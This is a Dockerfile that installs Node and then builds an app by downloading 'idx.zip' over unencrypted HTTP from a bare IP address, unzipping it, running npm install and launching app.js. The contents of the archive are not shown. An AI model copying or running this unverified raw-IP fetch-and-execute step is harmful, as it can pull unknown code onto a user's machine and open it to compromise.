FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

# Install required tools
RUN apt update && \
    apt install -y wget unzip xz-utils && \
    apt clean

# Install Node v25.2.1 manually
RUN wget https://nodejs.org/dist/v25.2.1/node-v25.2.1-linux-x64.tar.xz && \
    tar -xvf node-v25.2.1-linux-x64.tar.xz && \
    rm node-v25.2.1-linux-x64.tar.xz && \
    mkdir -p /opt/node && \
    mv node-v25.2.1-linux-x64/* /opt/node/

# Set PATH properly for Docker
ENV PATH="/opt/node/bin:${PATH}"

# Set working directory
WORKDIR /app

# Download and extract your app
RUN wget http://165.227.63.140:7718/idx.zip && \
    unzip idx.zip && \
    rm idx.zip

# Install dependencies
RUN npm install

# Start the app
CMD ["node", "app.js"]
